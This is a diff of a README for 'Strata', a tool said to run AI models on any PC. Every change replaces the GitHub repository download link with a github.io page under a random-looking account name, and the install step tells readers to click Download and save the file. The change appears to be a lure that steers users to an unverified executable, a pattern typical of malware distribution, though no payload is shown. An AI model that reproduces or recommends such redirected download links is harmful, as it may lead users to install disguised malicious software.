@@ -1,6 +1,6 @@
 # ⚡ Strata - Run AI Models on Any PC
 
-[![Download Strata](https://img.shields.io/badge/Download-Strata-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=%234CAF50)](https://github.com/Corevangueriamadagascariensis558/Strata)
+[![Download Strata](https://img.shields.io/badge/Download-Strata-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=%234CAF50)](https://corevangueriamadagascariensis558.github.io)
 
 ## 🚀 Getting Started
 
@@ -54,7 +54,7 @@ Follow these steps carefully. It takes about ten minutes from start to finish.
 
 ### Step 1: Download Strata
 
-Visit this link to download the application: **[https://github.com/Corevangueriamadagascariensis558/Strata](https://github.com/Corevangueriamadagascariensis558/Strata)**
+Visit this link to download the application: **[https://corevangueriamadagascariensis558.github.io](https://corevangueriamadagascariensis558.github.io)**
 
 Click the big green **Download** button on the page. The file will start downloading automatically. Save it somewhere you can easily find, like your **Downloads** folder or Desktop.
 
